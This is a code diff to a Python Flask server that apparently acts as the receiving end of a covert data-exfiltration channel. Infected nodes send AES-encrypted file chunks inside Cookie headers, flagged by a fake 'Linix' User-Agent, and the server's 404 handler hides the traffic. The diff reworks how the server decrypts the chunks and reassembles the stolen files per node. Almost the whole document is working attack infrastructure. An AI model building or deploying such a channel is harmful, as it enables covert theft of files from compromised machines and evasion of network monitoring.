@@ -1,3 +1,4 @@
+import os.path
 import random
 import socket
 import string
@@ -40,52 +41,65 @@ nodes_lock = threading.Lock()
 
 
 # Takes data from "exfil_files" and constructs the original file
-def process_exfil_file(sender):
+def process_exfil_file(node_id):
+    # print("PROCESSING FILE PLEASE WAIT")
     exfil_files_lock.acquire()
-    nonce = exfil_files[sender]['nonce']
-    ciphertext = exfil_files[sender]['data']
-    exfil_files.pop(sender)  # remove once we get the data (if it fails we don't want it sitting in our list)
+    filename = exfil_files[node_id]['name'].decode()
+    content = exfil_files[node_id]['data']
+    exfil_files.pop(node_id)  # remove once we get the data (if it fails we don't want it sitting in our list)
     exfil_files_lock.release()
 
-    cipher = AES.new(key, AES.MODE_CBC, nonce)
-    plaintext_encoded = unpad(cipher.decrypt(ciphertext), AES.block_size)  # decrypt contents
-    plaintext = plaintext_encoded.decode('ascii')
-    node_id_encoded, file_name_encoded, file_contents_encoded = plaintext.split("_")  # values are separated with underscores
-    node_id = base64.b64decode(node_id_encoded).decode('ascii')
-    file_name = base64.b64decode(file_name_encoded).decode('ascii')
-    file_contents = base64.b64decode(file_contents_encoded)
     text_extensions = ['asm', 'c', 'cfg', 'css', 'cpp', 'csv', 'cxx', 'h', 'hpp', 'html', 'htm', 'hxx', 'java', 'js',
                        'log', 'pl', 'php', 'py', 'rb', 'rtf', 's', 'sh', 'txt', 'xml']
-    if file_name.split('.')[1] in text_extensions:
-        with open(file_name, 'w') as f:
-            f.write(file_contents.decode('ascii'))
+
+    folder = "recovered_files/" + str(node_id) + "/"
+
+    if not os.path.isdir(folder):
+        os.mkdir(folder)
+
+    if filename.split('.')[1] in text_extensions:
+        with open(folder+filename, 'w') as f:
+            f.write(content.decode())
     else:
-        with open(file_name, 'wb') as f:
-            f.write(file_contents)
+        with open(folder+filename, 'wb') as f:
+            f.write(content)
 
 
-def handle_exfil_chunk(data, sender, cont):
-    print(data)
-    print(sender)
-    print(cont)
+def handle_exfil_chunk(data, cont):
+    # print(data)
+    # print(cont)
     if data is None:
         return Response()
-    if "_" in data:  # First data packet includes the nonce
-        nonce_encoded = data[0:len(data)-1]
+
+    # Process Message
+    try:
+        nonce_encoded, ciphertext_encoded = data.strip().split("_")
         nonce = base64.b64decode(nonce_encoded)
+        ciphertext = base64.b64decode(ciphertext_encoded)
+        cipher = AES.new(key, AES.MODE_CBC, nonce)
+        plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
+        node_id, message_encoded = plaintext.decode().split("_")
+        message = base64.b64decode(message_encoded)
+    except ValueError as error:
+        print("Bad encryption key or bad message format: "+str(error))
+        return Response()
+
+    if node_id not in exfil_files:  # First data packet includes the nonce
+        filename = message
         exfil_files_lock.acquire()
-        exfil_files[sender] = {'nonce': nonce, 'data': ''}  # relying on the fact that the sender's IP wont change before the file is received
+        exfil_files[node_id] = {'name': filename, 'data': b''}
         exfil_files_lock.release()
     else:  # Second and beyond packets are file contents
-        content = base64.b64decode(data)
+        # print(message)
+        # print(exfil_files)
         exfil_files_lock.acquire()
-        exfil_files[sender]['data'] += content
+        exfil_files[node_id]['data'] += message
         exfil_files_lock.release()
 
     if cont == 'close':
+        process_exfil_file(node_id)
         return Response()
     resp = Response()
-    resp.headers['Location'] = ''.join(random.choice(string.ascii_letters) for _ in range(random.randint(5, 25)))
     return resp
 
 
@@ -172,10 +186,8 @@ def handle_404(e):
     user_agent = request.headers.get('User-Agent')
     if 'Linix' in user_agent:
         cont = request.headers.get('Connection')
-        sender = request.environ['REMOTE_ADDR']
-        resp = handle_exfil_chunk(request.headers.get('Cookie'), sender, cont)
+        resp = handle_exfil_chunk(request.headers.get('Cookie')[2:], cont)
         if cont == 'close':
-            process_exfil_file(sender)
             return resp, 204
         return resp, 307
     return e, 404
